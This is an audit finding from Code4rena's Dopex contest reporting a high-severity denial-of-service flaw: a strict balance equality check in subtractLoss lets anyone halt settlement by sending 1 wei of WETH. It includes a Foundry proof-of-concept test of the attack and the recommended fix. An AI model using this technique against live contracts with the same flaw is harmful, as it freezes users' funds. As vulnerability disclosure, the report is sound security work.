---
# Core Classification
protocol: Dopex
chain: everychain
category: dos
vulnerability_type: dos

# Attack Vector Details
attack_type: dos
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 29456
audit_firm: Code4rena
contest_link: https://code4rena.com/reports/2023-08-dopex
source_link: https://code4rena.com/reports/2023-08-dopex
github_link: https://github.com/code-423n4/2023-08-dopex-findings/issues/1227

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:
  - dos

# Audit Details
report_date: unknown
finders_count: 96
finders:
  - jasonxiale
  - Inspex
  - 0xsurena
  - Tendency
  - Jiamin
---

## Vulnerability Title

[H-03] The settle feature will be broken if attacker arbitrarily transfer collateral tokens to the PerpetualAtlanticVaultLP

### Overview


This bug report is related to a smart contract vulnerability in the Dopex project. The `RdpxV2Core.settle` function reverts and the protocol stops when an attacker arbitrarily transfers collateral tokens to the PerpetualAtlanticVaultLP contract. This is because the `collateral.balanceOf(address(this))` and `_totalCollateral` values are different. The `PerpetualAtlanticVaultLP.subtractLoss` requires that `collateral.balanceOf(address(this))` exactly match with `_totalCollateral - loss`, which is not possible in this case. Even the admin cannot fix this issue as there is no function that synchronizes `_totalCollateral` with `collateral.balanceOf(address(this))` without moving tokens. 

The recommended mitigation step for this bug is to use `>=` instead of `==` at `PerpetualAtlanticVaultLP.subtractLoss`. This bug was confirmed by psytama (Dopex) via duplicate issue 619.

### Original Finding Content


<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L199-L205> 

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L359-L361> 

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L772-L774>

`RdpxV2Core.settle` reverts and the protocol stops.

### Proof of Concept

If a collateral token(WETH) is arbitrarily sent to PerpetualAtlanticVaultLP, the values of `collateral.balanceOf(address(this))` and `_totalCollateral` will be different.

Since `PerpetualAtlanticVaultLP.subtractLoss` requires that `collateral.balanceOf(address(this))` exactly match with `_totalCollateral - loss`, `PerpetualAtlanticVaultLP.subtractLoss` will be failed if an attacker arbitrarily transfers collateral tokens to the PerpetualAtlanticVaultLP contract.

```solidity
function subtractLoss(uint256 loss) public onlyPerpVault {
  require(
    collateral.balanceOf(address(this)) == _totalCollateral - loss,
    "Not enough collateral was sent out"
  );
  _totalCollateral -= loss;
}
```

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L199-L205>

Since there is no function that synchronizes `_totalCollateral` with `collateral.balanceOf(address(this))` without moving tokens, even admin cannot fix.

This is exploit PoC. Add this test case at `tests/perp-vault/Unit.t.sol`

```solidity
function testSettlePoC() public {
  weth.mint(address(1), 1 ether);
  weth.mint(address(777), 1 ether); // give some tokens to attacker

  deposit(1 ether, address(1));

  vault.purchase(1 ether, address(this));

  uint256[] memory ids = new uint256[](1);
  ids[0] = 0;

  skip(86500); // expire

  priceOracle.updateRdpxPrice(0.010 gwei); // ITM
  uint256 wethBalanceBefore = weth.balanceOf(address(this));
  uint256 rdpxBalanceBefore = rdpx.balanceOf(address(this));

  // attack
  vm.startPrank(address(777), address(777));
  weth.transfer(address(vaultLp), 1); // send 1 wei of collateral
  vm.stopPrank();

  vm.expectRevert("Not enough collateral was sent out");
  vault.settle(ids);
}
```

### Recommended Mitigation Steps

Use `>=` instead of `==` at `PerpetualAtlanticVaultLP.subtractLoss`

```diff
function subtractLoss(uint256 loss) public onlyPerpVault {
  require(
-   collateral.balanceOf(address(this)) == _totalCollateral - loss,
+   collateral.balanceOf(address(this)) >= _totalCollateral - loss,
    "Not enough collateral was sent out"
  );
  _totalCollateral -= loss;
}
```

**[psytama (Dopex) confirmed via duplicate issue 619](https://github.com/code-423n4/2023-08-dopex-findings/issues/619)**


***



### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | Dopex |
| Report Date | N/A |
| Finders | jasonxiale, Inspex, 0xsurena, Tendency, Jiamin, circlelooper, nobody2018, Baki, Juntao, visualbits, juancito, chainsnake, BugzyVonBuggernaut, Snow24, 0xbranded, LFGSecurity, clash, spidy730, sh1v, auditsea, GangsOfBrahmin, 0x3b, sl1, tnquanghuy0512, kutugu, KrisApostolov, Krace, dirk\_y, 0xc0ffEE, QiuhaoLi, \_\_141345\_\_, max10afternoon, Toshii, ubermensch, rvierdiiev, bart1e, Nyx, pontifex, ravikiranweb3, savi0ur, kodyvim, 0xWaitress, parsely, Udsen, Aymen0909, chaduke, oakcobalt, bin2chen, Kow, pks\_, lanrebayode77, LokiThe5th, volodya, 0xvj, carrotsmuggler, wintermute, ke1caM, ayden, T1MOH, SpicyMeatball, Norah, Evo, AkshaySrivastav, said, 1, 2, 0xCiphky, RED-LOTUS-REACH, codegpt, rokinot, gjaldon, ladboy233, HChang26, SBSecurity, grearlake, Blockian, klau5, degensec, ge6a, mahdikarimi, tapir, 0xDING99YA, DanielArmstrong, nirlin, blutorque, sces60107, Yanchuan, peakbolt, ak1, 0xklh, crunch, ABA, asui, mert\_eren |

### Source Links

- **Source**: https://code4rena.com/reports/2023-08-dopex
- **GitHub**: https://github.com/code-423n4/2023-08-dopex-findings/issues/1227
- **Contest**: https://code4rena.com/reports/2023-08-dopex

### Keywords for Search

`DOS`

